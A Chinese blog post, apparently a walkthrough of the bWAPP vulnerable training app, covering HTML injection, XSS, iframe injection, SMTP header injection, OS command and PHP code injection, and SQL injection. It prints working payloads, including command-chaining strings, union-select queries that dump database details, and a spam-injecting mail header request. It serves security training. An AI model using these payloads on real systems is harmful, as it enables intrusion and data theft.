<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" >

<title>bWAPP通关教程 | Gridea</title>
<meta name="description" content="温故而知新">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<link rel="shortcut icon" href="https://jinqipiaopiao.github.io//favicon.ico?v=1627392642729">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
<link rel="stylesheet" href="https://jinqipiaopiao.github.io//styles/main.css">


<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>


<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />


  </head>
  <body>
  
    <nav class="navbar border fixed split-nav">
  <div class="nav-brand">
    <h3><a href="https://jinqipiaopiao.github.io/">Gridea</a></h3>
  </div>
  <div class="collapsible">
    <input id="collapsible1" type="checkbox" name="collapsible1">
    <button>
      <label for="collapsible1">
        <div class="bar1"></div>
        <div class="bar2"></div>
        <div class="bar3"></div>
      </label>
    </button>
    <div class="collapsible-body">
      <ul class="inline">
        
          <li>
            
              <a href="/" class="menu">
                首页
              </a>
            
          </li>
        
          <li>
            
              <a href="/archives" class="menu">
                归档
              </a>
            
          </li>
        
          <li>
            
              <a href="/tags" class="menu">
                标签
              </a>
            
          </li>
        
          <li>
            
              <a href="/post/about" class="menu">
                关于
              </a>
            
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div id="top" class="row site">
      <div class="sm-12 md-8 col">
        <div class="paper">
          <article class="article">
            <h1>bWAPP通关教程</h1>
            <p class="article-meta">
              2021-05-06
              
            </p>
            
            <div class="post-content">
              <p>用户名：bee,密码：bug，点击start登陆后即可进行测试<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620309945618.png" alt="" loading="lazy"></p>
<h1 id="html-injection-reflectedget">HTML Injection-Reflected(GET)</h1>
<h1 id="1low">1.low</h1>
<p>这里有两个框让我们输入,先看看源码<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620310110308.png" alt="" loading="lazy"><br>
这里吧我们输入的firstname和lastname直接带进html了<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620310272174.png" alt="" loading="lazy"><br>
html是按照我们等级来给函数的，我们看看no_check函数<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620310412618.png" alt="" loading="lazy"><br>
没有过滤就直接输入了，所以我们直接在First name：和Last name：输入xss代码即可</p>
<pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620310614962.png" alt="" loading="lazy"><br>
成功<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620310697697.png" alt="" loading="lazy"><br>
方法二：当然我们还可以这样，在bwapp目录下放置一个图片</p>
<pre><code>&lt;img src=&quot;bug.txt&quot;&gt;
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://jinqipiaopiao.github.io//post-images/1620310804656.png" alt="" loading="lazy"></figure>
<h1 id="2medium也就是中等难度">2.medium(也就是中等难度)</h1>
<p>查看源码发现，这里用了吧尖括号换成实体了，但是用lurldecode函数我们则可以想到直接把我们要输入的值先转成url格式那么他之后就算编码url也不会改变我们输入的内容。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620310995057.png" alt="" loading="lazy"><br>
然后在网上找在线转url<br>
然后输入</p>
<pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;
</code></pre>
<p>转换后为</p>
<pre><code>%3cscript%3ealert(%2fxss%2f)%3c%2fscript%3e
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://jinqipiaopiao.github.io//post-images/1620310697697.png" alt="" loading="lazy"></figure>
<h1 id="3high">3.high</h1>
<p>看看源码，这里把我们的符号都设置成实体了，所以这是安全的<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620311260056.png" alt="" loading="lazy"></p>
<h1 id="html-injection-reflected-url">HTML Injection - Reflected (URL)</h1>
<h1 id="1low-2">1.low</h1>
<p>我们可以发现通关url可以传输，所以我们在url中构造语句<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620391834747.png" alt="" loading="lazy"><br>
抓包之后把url中添加上</p>
<pre><code>?a=&lt;script&gt;alert(/xss/)&lt;/script&gt;
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://jinqipiaopiao.github.io//post-images/1620391899226.png" alt="" loading="lazy"></figure>
<h1 id="中等高等无法绕过">中等高等无法绕过</h1>
<h1 id="html-injection-stored-blog">HTML Injection - Stored (Blog)</h1>
<h1 id="1low-3">1.low</h1>
<p>直接输入我们的语句即可</p>
<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620392462080.png" alt="" loading="lazy"><br>
然后点击提交即可<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620392472774.png" alt="" loading="lazy"></p>
<h1 id="中等高等无法绕过-2">中等高等无法绕过</h1>
<h1 id="iframe-injection">iFrame Injection</h1>
<p>iframe是可用于在HTML页面中嵌入一些文件(如文档，视频等)的一项技术。对iframe最简单的解释就是“iframe是一个可以在当前页面中显示其它页面内容的技术”。<br>
通过利用iframe标签对网站页面进行注入，是利用了HTML标签，实际上就是一个阅读器，可以阅读通过协议加载的活服务器本地的文件、视频等</p>
<pre><code>&lt;?php
if($_COOKIE[&quot;security_level&quot;] == &quot;1&quot; || $_COOKIE[&quot;security_level&quot;] == &quot;2&quot;)
{
?&gt;
&lt;iframe frameborder=&quot;0&quot; src=&quot;robots.txt&quot; height=&quot;&lt;?php echo xss($_GET[&quot;ParamHeight&quot;])?&gt;&quot; width=&quot;&lt;?php echo xss($_GET[&quot;ParamWidth&quot;])?&gt;&quot;&gt;&lt;/iframe&gt;
&lt;?php
}
else
{
?&gt;
&lt;iframe frameborder=&quot;0&quot; src=&quot;&lt;?php echo xss($_GET[&quot;ParamUrl&quot;])?&gt;&quot; height=&quot;&lt;?php echo xss($_GET[&quot;ParamHeight&quot;])?&gt;&quot; width=&quot;&lt;?php echo xss($_GET[&quot;ParamWidth&quot;])?&gt;&quot;&gt;&lt;/iframe&gt;
&lt;?php
}
?&gt;
</code></pre>
<p>安全等级对应的过滤函数</p>
<pre><code>function xss($data)
{
switch($_COOKIE[&quot;security_level&quot;])
{
case &quot;0&quot; :
$data = no_check($data);      
break;
case &quot;1&quot; :
$data = xss_check_4($data);
break;
case &quot;2&quot; :
$data = xss_check_3($data);
break;
default :
$data = no_check($data);
break;   
}
return $data;
}
</code></pre>
<h1 id="1low-4">1.low</h1>
<p><strong>方法一：</strong><br>
由于没有对参数进行过滤就输出我们可以控制param的输入来访问本地文件</p>
<pre><code>?ParamUrl=.../README.txt&amp;ParamWidth=250&amp;ParamHeight=250
</code></pre>
<p>也可以使用百度链接来访问那么在该页面中就可以显示百度搜索页面内容</p>
<pre><code>?ParamUrl=http://www.baidu.com&amp;ParamWidth=250&amp;ParamHeight=250
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://jinqipiaopiao.github.io//post-images/1620395553086.png" alt="" loading="lazy"></figure>
<h1 id="方法二">方法二:</h1>
<p>也可以闭合iframe标签然后在让他输出script代码<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620395705225.png" alt="" loading="lazy"></p>
<pre><code>?ParamUrl=&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;ParamWidth=250&amp;ParamHeight=250
</code></pre>
<h1 id="2medium">2.medium</h1>
<p>从代码可以看出，medium等级不能控制paramurl的输入，所以只能通过控制ParamHeight和ParamWidth来实现注入。用<code>&quot;&gt;&lt;/frame&gt;</code>闭合，刚开始用了&quot;&quot;,还在想怎么没弹出来,忘了xss_check4的addslashes()函数会在预定义字符(单引号，双引号，反斜杠，NULL)之前提娜佳反斜杠了</p>
<pre><code>function xss_check_4($data)
{

// addslashes - returns a string with backslashes before characters that need to be quoted in database queries etc.
// These characters are single quote ('), double quote (&quot;), backslash (\) and NUL (the NULL byte).
// Do NOT use this for XSS or HTML validations!!!

return addslashes($data);
}
</code></pre>
<p>payload:</p>
<pre><code>?ParamUrl=robots.txt&amp;ParamWidth=250&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;ParamHeight=250
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://jinqipiaopiao.github.io//post-images/1620427490652.png" alt="" loading="lazy"></figure>
<h1 id="3high-2">3.high</h1>
<p>对输出进行了限制并且对预定义字符进行了HTML实体解码所以绕过失败。。。</p>
<pre><code>function xss_check_3($data, $encoding = &quot;UTF-8&quot;)
{

// htmlspecialchars - converts special characters to HTML entities    
// '&amp;' (ampersand) becomes '&amp;amp;' 
// '&quot;' (double quote) becomes '&amp;quot;' when ENT_NOQUOTES is not set
// &quot;'&quot; (single quote) becomes '&amp;#039;' (or &amp;apos;) only when ENT_QUOTES is set
// '&lt;' (less than) becomes '&amp;lt;'
// '&gt;' (greater than) becomes '&amp;gt;'  

return htmlspecialchars($data, ENT_QUOTES, $encoding);
   
}
</code></pre>
<p>————————————————<br>
版权声明：本文为CSDN博主「0nc3」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/syy0201/article/details/89006638</p>
<h1 id="mail-header-injection-smtp">Mail Header Injection (SMTP)</h1>
<p>什么是电子邮件标题注入？<br>
发表于 2017年5月3日由伊恩·马斯喀特<br>
通常的做法是网站实施联系表单，反过来将合法用户的电子邮件发送给消息的预期收件人。大多数情况下，这样的联系表单将设置SMTP标头From，Reply-to以便让收件人轻松处理联系表单中的通信，就像其他电子邮件一样。</p>
<p>不幸的是，除非用户的输入在插入SMTP头之前被验证，否则联系表单可能容易受到电子邮件头插入（也称为SMTP头注入）的攻击。这是因为攻击者可以将额外的头部注入到消息中，从而指示SMTP服务器执行与预期不同的指令。</p>
<p>以下PHP代码是一种易受电子邮件头部注入攻击的典型联系人表单的示例。以下代码将由网站访问者提供的名称和电子邮件地址，并准备电子邮件的标题列表。</p>
<p>使用From标题，以便电子邮件的收件人（在本示例中为root @ localhost）将知道电子邮件作者是谁。回复标题允许电子邮件的收件人通过他们的电子邮件客户端中的回复按钮回复发送电子邮件的人。</p>
<pre><code>&lt;?php
if(isset($_POST['name']))
{
$name = $_POST['name'];
$replyto = $_POST['replyTo'];
$message = $_POST['message'];

$to = 'root@localhost';
$subject = 'My Subject';

// Set SMTP headers
$headers = &quot;From: $name \n&quot; .
&quot;Reply-To: $replyto&quot;;

mail($to, $subject, $message, $headers);
}
?&gt;
</code></pre>
<p>典型的正版POST请求如下。</p>
<pre><code>POST /contact.php HTTP/1.1
Host: www.example.com

name=Joe Bloggs&amp;replyTo=joebloggs@example.com&amp;message=Example message
</code></pre>
<p>攻击者可以通过发送以下POST请求来滥用此联系表单。</p>
<pre><code>POST /contact.php HTTP/1.1
Host: www.example.com

name=Attacker\nbcc: spam@victim.com&amp;replyTo=attacker@attacker.com&amp;message=Attacker message
</code></pre>
<p>在此示例中，攻击者正在插入换行符（\n在\r\nWindows系统上的大多数UNIX和Linux系统上），并附加一个包含附加电子邮件地址的密码SMTP标头，SMTP服务器将向BCC发送电子邮件。</p>
<p>攻击者可以使用这样的策略匿名发送大量消息，甚至发送网络钓鱼电子邮件，其中接收者认为这些消息源自可信来源。还值得注意的是，此漏洞不限于PHP; 它可能会影响任何基于任意用户输入发送电子邮件的应用程序。</p>
<p>检测电子邮件头部注入漏洞<br>
为了自动检测电子邮件头部注入，我们需要依赖中介服务，因为检测到这样一个漏洞需要带外和时间延迟的向量。Acunetix 在自动扫描期间通过使用AcuMonitor作为其中介服务来解决此问题。</p>
<p>在扫描期间，Acunetix将找到联系表单，并注入指向AcuMonitor电子邮件地址的自定义BCC SMTP标头。如果有问题的应用程序导致SMTP服务器发送电子邮件到AcuMonitor，那么AcuMonitor知道它是易受攻击的，它会发送一个通知回到Acunetix，表明它应该提高电子邮件头插入警报。</p>
<p>减轻<br>
减少电子邮件标题注入涉及验证用户输入，不允许输入中的任何换行符，这将导致添加另一个SMTP标头。一般来说，当验证用户输入时，实现强输入验证的最简单和最强劲的方法是通过白名单中允许的字符用于SMTP标头。</p>
<h1 id="os-command-injection">OS command injection</h1>
<p><strong>1.low</strong><br>
直接在输入框中输入</p>
<pre><code>www.nsa.gov | whoami
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620465491757.png" alt="" loading="lazy"><br>
<strong>2.medium</strong><br>
这里只是把&amp;和；替换掉了，我们一样可以通过<br>
所以就输入low时的就行</p>
<pre><code>www.nsa.gov | whoami

function commandi_check_l($data)
{
$input = str_replace(&quot;&amp;&quot;, &quot;&quot;, $data);
$input = str_replace(&quot;;&quot;, &quot;&quot;, $input);
return $input;
}
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620465491757.png" alt="" loading="lazy"><br>
<strong>高等无法绕过</strong></p>
<pre><code>function commandi_check_2($data)
{
return escapeshellcmd($data);    
}
</code></pre>
<h1 id="os-command-injection-blind">OS Command Injection - Blind</h1>
<p>这里是根据反应时间判断命令是否成功执行<br>
<strong>1.low</strong><br>
在输入框中输入</p>
<pre><code>whoami'sleep 5'
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620466770682.png" alt="" loading="lazy"><br>
或者</p>
<pre><code>||whoami `sleep 5 `
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620466770682.png" alt="" loading="lazy"><br>
<strong>2.medium</strong><br>
和low一样</p>
<h1 id="php-code-injection">PHP Code Injection</h1>
<p><strong>1.low</strong></p>
<pre><code>http://127.0.0.1:8000/phpi.php?message=phpinfo()
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620467071555.png" alt="" loading="lazy"><br>
<strong>2.medium&amp;3.high</strong><br>
中等高等用了htmlspecialchars函数故无法绕过<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620467207776.png" alt="" loading="lazy"></p>
<h1 id="server-side-includes-ssi-injection">Server-Side Includes (SSI) Injection</h1>
<p>什么是SSI和SSI注入</p>
<pre><code> SSI是英文Server Side Includes的缩写，翻译成中文就是服务器端包含的意思。从技术角度上说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针。SSI具有强大的功能，只要使用一条简单的SSI 命令就可以实现整个网站的内容更新，时间和日期的动态显示，以及执行shell和CGI脚本程序等复杂的功能。SSI 可以称得上是那些资金短缺、时间紧张、工作量大的网站开发人员的最佳帮手。本文将主要结合Apache服务器介绍SSI的使用方法。 

 ps：(Server-side Includes) 服务器端包含提供了一种对现有HTML文档增加动态内容的方法。apache和iis都可以通过配置支持SSI，在网页内容被返回给用户之前，服务器会执行网页内容中的SSI标签。在很多场景中，用户输入的内容可以显示在页面中，比如一个存在反射XSS漏洞的页面，如果输入的payload不是xss代码而是ssi的标签，服务器又开启了ssi支持的话就会存在SSI漏洞
</code></pre>
<p><strong>1.low</strong><br>
First name:</p>
<pre><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
</code></pre>
<p>Last name:</p>
<pre><code>s
</code></pre>
<p><strong>2.medium</strong><br>
中等过滤的是单引号双引号反斜杠和null所以我们把双引号改成斜杠即可<br>
First name:</p>
<pre><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;
</code></pre>
<p>Last name:</p>
<pre><code>s
</code></pre>
<p><strong>3.high</strong><br>
不能绕过</p>
<pre><code>给出high难度的防御代码，也可以作为实际环境中的防御措施：

function check($data, $encoding = &quot;UTF-8&quot;)
{

// htmlspecialchars - converts special characters to HTML entities    
// '&amp;' (ampersand) becomes '&amp;amp;' 
// '&quot;' (double quote) becomes '&amp;quot;' when ENT_NOQUOTES is not set
// &quot;'&quot; (single quote) becomes '&amp;#039;' (or &amp;apos;) only when ENT_QUOTES is set
// '&lt;' (less than) becomes '&amp;lt;'
// '&gt;' (greater than) becomes '&amp;gt;'  

return htmlspecialchars($data, ENT_QUOTES, $encoding);   
}
</code></pre>
<h1 id="sql-injection-getsearch">SQL Injection (GET/Search)</h1>
<pre><code>    手工注入步骤

    下面简要介绍手工注入（非盲注）的步骤。

    1.判断是否存在注入，注入是字符型还是整数型

    2.猜解SQL查询语句中的字段数 (order by )

    3.确定显示的字段顺序 

    4.获取当前数据库 (爆库)

    5.获取数据库中的表 (爆表)

    6.获取表中的字段名 (爆字段)

    7.下载数据 (爆数据)
</code></pre>
<p><strong>1.low</strong><br>
判断注入点<br>
输入单引号报错<br>
那么猜测SQL语句如下：</p>
<pre><code>SELECT * FROM movies WHERE title LIKE '%&quot; . ($title) . &quot;%'
</code></pre>
<p>然后搜索'and 1=1#爆出数据<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620470458416.png" alt="" loading="lazy"><br>
然后判断有几个字段</p>
<pre><code>' order by 1,2,3,4,5,6,7,8#
' order by 1,2,3,4,5,6,7#
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620470591162.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1620470594727.png" alt="" loading="lazy"><br>
然后再想办法得出页面输入的是哪几个字段因为页面只显示了五个字段,所以构建</p>
<pre><code>' union select 1,2,3,4,5,6,7#
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620470846336.png" alt="" loading="lazy"><br>
发现显示的是2.3.4.5然后就可以继续让页面显示其他数据了例如数据库用户等等只要对应相对的地方，然后能够显示出来构建爆出版本号，数据库，用户，想要爆出什么数据输入对应的函数即可<br>
相关函数<br>
system_user()         系统用户名<br>
user()                用户名<br>
current_user          当前用户名<br>
session_user()        连接数据库的用户名<br>
database()            数据库名<br>
version()             MYSQL数据库版本<br>
load_file()           MYSQL读取本地文件的函数<br>
@@datadir             读取数据库路径<br>
@@basedir             MYSQL 安装路径<br>
@@version_compile_os  操作系统</p>
<pre><code>' union select 1,2,version(),database(),user(),6,7#
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620470982721.png" alt="" loading="lazy"><br>
<strong>2.medium</strong><br>
这边源码观察到采用addslashes()函数对预定义字符进行了转义  :<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620474471795.png" alt="" loading="lazy"></p>
<pre><code>    addslashes()函数
</code></pre>
<p>返回在预定义字符之前添加反斜杠的字符串<br>
预定义字符是：<br>
单引号(')<br>
双引号(&quot;)<br>
反斜杠()<br>
null<br>
查看mysql编码,  如果是GBK编码且操作系统是UTF-8编码,  则可以用宽字节来绕过:</p>
<p>可惜mysql编码是utf-8:无法绕过</p>
<p><strong>3.high</strong><br>
采用了mysql_real_escape_string()函数来防御<br>
mysql_real_escape_string()函数<br>
转义SQL语句中使用的字符串中的特殊字符.<br>
下列字符受影响：<br>
\x00<br>
\n<br>
\r<br>
<br>
'<br>
&quot;<br>
\x1a<br>
如果成功，则该函数返回被转移的字符串，如果失败，则返回false<br>
无法注入</p>
<h1 id="sql-injection-getselect">SQL Injection (GET/Select)</h1>
<p>相比上一关这里再前端采用了下拉菜单选择来控制用户的输入防止恶意输入：<br>
但是即便如此也只是表面功夫而已<br>
由于是get型，攻击者可以通过修改url参数数据来注入：<br>
<strong>1.low</strong><br>
无任何防护，像上一关一样直接注入即可<br>
判断是何注入：</p>
<pre><code>http://127.0.0.1:8000/sqli_2.php?movie=1 and 1=1#&amp;action=go
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://jinqipiaopiao.github.io//post-images/1620475788809.png" alt="" loading="lazy"></figure>
<pre><code>http://127.0.0.1:8000/sqli_2.php?movie=1 and 1=2#&amp;action=go
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620475808681.png" alt="" loading="lazy"><br>
得出为数字型注入<br>
然后判断字段数</p>
<pre><code>http://127.0.0.1:8000/sqli_2.php?movie=1 order by 1,2,3,4,5,6,7,8#
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://jinqipiaopiao.github.io//post-images/1620475988671.png" alt="" loading="lazy"></figure>
<pre><code>http://127.0.0.1:8000/sqli_2.php?movie=1 order by 1,2,3,4,5,6,7#
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620475984589.png" alt="" loading="lazy"><br>
得出为7个<br>
然后看页面回显哪几列</p>
<pre><code>http://127.0.0.1:8000/sqli_2.php?movie=0 union select  1,2,3,4,5,6,7#&amp;action=go
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://jinqipiaopiao.github.io//post-images/1620476110224.png" alt="" loading="lazy"></figure>
<p>然后让在对应栏位里输出版本号，数据库，用户</p>
<pre><code>http://127.0.0.1:8000/sqli_2.php?movie=0%20union%20select%20%201,version(),database(),user(),5,6,7#&amp;action=go
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620476166191.png" alt="" loading="lazy"><br>
<strong>Medium&amp;High</strong><br>
Medium和High级别分别采用了addslashed()和mysql_real_escape_string()来过滤特殊字符：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620476275790.png" alt="" loading="lazy"><br>
但是这是数字型注入，对于字符型注入的防御策略并不起作用<br>
所以依然可以和low等级一样进行注入<br>
<strong>SQL Injection (POST/Search)</strong></p>
<p>与Get型的大同小异,  只不过这里采用Post请求方式,<br>
虽然Post型比Get型请求更安全,  但是想要注入只不过麻烦一点而已<br>
攻击者仍然可以通过抓包修改数据包的方式了注入<br>
<strong>1.low</strong><br>
判断注入点<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620477553873.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1620477557985.png" alt="" loading="lazy"><br>
得出字符型注入<br>
接下来就和Get型一样了，只不过再多了一步抓包而已。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620477727358.png" alt="" loading="lazy"><br>
<strong>Medium&amp;High</strong><br>
分别用了addslashes()和mysql_real_escape_string()函数防御：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620477838661.png" alt="" loading="lazy"><br>
且在Medium中, mysql编码为utf-8, 无法用宽字节绕过, 安全</p>
<h1 id="sql-injection-postselect">SQL Injection (POST/Select)</h1>
<p>方法和上一关一样<br>
注入类型：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620478586919.png" alt="" loading="lazy"><br>
回显正常说明为数字型注入<br>
判断字段数：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620478700148.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1620478704087.png" alt="" loading="lazy"><br>
说明为7个字段<br>
判断显示的是哪几个字段<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620478854544.png" alt="" loading="lazy"><br>
说明为2，3，4，5<br>
然后根据显示字段使其显示相关信息如，数据库，用户，版本号<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620478990621.png" alt="" loading="lazy"><br>
<strong>SQL Injection (AJAX/JSON/jQuery)</strong><br>
通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行实时更新。<br>
什么是 AJAX ？<br>
AJAX = 异步 JavaScript 和 XML。<br>
AJAX 是一种用于创建快速动态网页的技术。<br>
通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。<br>
传统的网页（不使用 AJAX）如果需要更新内容，必需重载整个网页面。<br>
有很多使用 AJAX 的应用程序案例：新浪微博、Google 地图、开心网等等。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620480149621.png" alt="" loading="lazy"><br>
对应的js代码如下:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620480339703.png" alt="" loading="lazy"><br>
<strong>1.low</strong><br>
直接用get型url访问是不行的：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620480426053.png" alt="" loading="lazy"><br>
在js中采用了getJSON来实时更新查询结果,<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620480515136.png" alt="" loading="lazy"><br>
然后鼠标右键打开inspect Element点击network当你在页面输入框中输入时你输一个对应在network就会出现一个可以看到<br>
http://localhost:8080/bWAPP/sqli_10-2.php?<br>
是以这个打头的所以可以间接的从sqli_10-2.php注入：<br>
注意这里得用url编码<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620480767947.png" alt="" loading="lazy"><br>
也可以在sqli_10-1.php搜索框注入：</p>
<pre><code>Iron%' and 1=1 #
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620480883220.png" alt="" loading="lazy"><br>
<strong>Medium&amp;High</strong><br>
分别用了addslashes()和mysql_real_escape_string()函数防御，且在MySQ编码为utf-8,无法用宽字节绕过，安全。</p>
<h1 id="sql-injection-captcha">SQL Injection (CAPTCHA)</h1>
<p>（无法使用，不知道是我的问题还是。。）</p>
<h1 id="sql-injection-login-formhero">SQL Injection (Login Form/Hero)</h1>
<p><strong>1.low</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1620725573376.png" alt="" loading="lazy"><br>
我们输入4，仍然可以注入<br>
我们输入5<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620725577052.png" alt="" loading="lazy"><br>
说明只有四列<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620725580058.png" alt="" loading="lazy"><br>
找到回显<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620725584568.png" alt="" loading="lazy"><br>
这里有报错的话，我们直接报错注入<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620725589145.png" alt="" loading="lazy"><br>
组合查询数据<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620725592761.png" alt="" loading="lazy"><br>
<strong>medium&amp;high</strong><br>
继续构造用户名,  发现服务器只返回了用户名和密码是否正确(合法):<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620725685381.png" alt="" loading="lazy"><br>
查看源码发现对用户名和密码进行了相应的防护:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620725714762.png" alt="" loading="lazy"><br>
分别用了addslashes()和mysql_real_escape_string()函数防御,</p>
<p>且在mysql编码为utf-8, 无法用宽字节绕过, 安全。</p>
<h1 id="sql-injection-login-formuser">SQL Injection (Login Form/User)</h1>
<p><strong>1.low</strong><br>
继续像上一关那样思路,</p>
<p>构造万能登录用户名,  密码随意:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620731757049.png" alt="" loading="lazy"><br>
发现无法注入。<br>
查看源码逻辑(黑白盒结合测试),  它先是判断用户名是否存在,  存在之后再判断密码是否正确:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620731761989.png" alt="" loading="lazy"><br>
问了一下朋友,  得知这曾经是一道CTF的题,</p>
<p><strong>分析</strong><br>
既然sql语句只发生在查询用户名处,  所以注入也只能在用户名,  (因为需要通过用户名验证, 再通过密码)</p>
<p>注入单引号:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620731767860.png" alt="" loading="lazy"><br>
接着判断注入点<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620731772674.png" alt="" loading="lazy"><br>
发现无法判断,  因为前端回显的结果只有当密码(第二个if语句)也正确时才会显示。<br>
因此无法使用order by 判断字段数 (判断注入点是为了用order by来得到字段数)<br>
但是可以直接通过联合查询得到字段数:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620731776758.png" alt="" loading="lazy"><br>
判断字段的显示顺序<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620731780883.png" alt="" loading="lazy"><br>
无法判断,  因为前端回显的结果只有当密码(第二个if语句)也正确时才会显示。</p>
<p>所以我们进入数据库实验:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620731784722.png" alt="" loading="lazy"><br>
可以看到, 联合查询3的位置对应password字段,  且password字段的值是经过md5加密过的,<br>
<img src="https://jinqipiaopiao.github.io//post-images/1620731788977.png" alt="" loading="lazy"><br>
由于用户名和密码是分开进行判断的,  为了能够回显出报错信息,  需要注入的联合查询字段(顺序为3)与输入的密码相等</p>
<p>比如,  注入的联合查询为:</p>
<pre><code>' union select 1,2,3,4,5,6,7,8,9 #
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1620731793438.png" alt="" loading="lazy"><br>
<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>c</mi><mi>o</mi><mi>r</mi><mi>d</mi><mi>s</mi><mi>e</mi><mi>t</mi><mi mathvariant="normal">从</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">据</mi><mi mathvariant="normal">库</mi><mi mathvariant="normal">中</mi><mi mathvariant="normal">搜</mi><mi mathvariant="normal">索</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">有</mi><mi mathvariant="normal">了</mi><mi mathvariant="normal">返</mi><mi mathvariant="normal">回</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">即</mi></mrow><annotation encoding="application/x-tex">recordset从数据库中搜索就有了返回值，即</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">d</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">从</span><span class="mord cjk_fallback">数</span><span class="mord 